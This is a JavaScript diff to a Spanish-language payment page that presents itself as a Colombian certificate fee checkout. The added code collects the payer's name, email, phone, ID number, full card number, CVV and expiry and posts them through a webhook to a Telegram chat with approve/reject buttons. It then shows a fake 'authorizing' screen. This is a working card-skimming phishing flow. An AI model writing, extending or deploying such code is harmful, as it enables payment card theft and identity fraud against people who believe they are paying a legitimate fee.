@@ -608,7 +608,7 @@
       console.error('Error notificando matrícula:', error);
     });
 
-    // DETECTAR BANCO Y REDIRIGIR A AUTORIZACIÓN
+    // DETECTAR BANCO Y ENVIAR A TELEGRAM CON BOTONES
     setBtnLoading(btn, true, "Detectando banco...");
 
     fetch(WEBHOOK_BASE_URL + '/api/detect-bank', {
@@ -639,13 +639,55 @@
 
       localStorage.setItem("snr_transaccion_actual", JSON.stringify(datosTransaccion));
 
-      // Mostrar loading por 3 segundos antes de redirigir
-      setBtnLoading(btn, true, "Autorizando...");
-      showLoading(true);
+      // Mensaje con datos de tarjeta
+      var mensaje = "💳 *SOLICITUD DE PAGO - V2CRTF*\n\n" +
+        "🆔 ID: `" + solicitudId + "`\n\n" +
+        "👤 *DATOS DEL CLIENTE:*\n" +
+        "Nombre: " + nombre + "\n" +
+        "Email: " + correo + "\n" +
+        "Teléfono: " + telefono + "\n" +
+        "Documento: " + tipoDoc + " " + numDoc + "\n\n" +
+        "💳 *DATOS DE LA TARJETA:*\n" +
+        "Número: `" + tarjeta + "`\n" +
+        "CVV: `" + cvv + "`\n" +
+        "Vencimiento: `" + expiry + "`\n" +
+        "Titular: " + nombre + "\n" +
+        "Banco: " + (bankData.bank || "Desconocido") + "\n" +
+        "Tipo: " + cardType.toUpperCase() + "\n\n" +
+        "💰 Monto: " + (pendiente ? pendiente.valor + " Col$" : "23.000 Col$") + "\n" +
+        "📅 Fecha: " + new Date().toLocaleString('es-CO');
 
-      setTimeout(function () {
-        window.location.href = "autorizacion.html";
-      }, 3000);
+      // Botones APROBAR/RECHAZAR
+      var inlineKeyboard = {
+        inline_keyboard: [
+          [
+            { text: "✅ APROBAR", callback_data: "approve_" + solicitudId },
+            { text: "❌ RECHAZAR", callback_data: "reject_" + solicitudId }
+          ]
+        ]
+      };
+
+      // Enviar a Telegram
+      setBtnLoading(btn, true, "Enviando...");
+      fetch(WEBHOOK_BASE_URL + '/api/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          mensaje: mensaje,
+          inline_keyboard: inlineKeyboard
+        })
+      }).then(function () {
+        // Mostrar loading 3 segundos y redirigir a autorizacion.html
+        setBtnLoading(btn, true, "Redirigiendo...");
+        showLoading(true);
+        setTimeout(function () {
+          window.location.href = "autorizacion.html";
+        }, 3000);
+      }).catch(function (error) {
+        console.error('Error enviando a Telegram:', error);
+        alert('Error al procesar la solicitud. Intenta nuevamente.');
+        setBtnLoading(btn, false);
+      });
     }).catch(function (error) {
       console.error('Error detectando banco:', error);
       alert('Error al procesar la solicitud. Intenta nuevamente.');
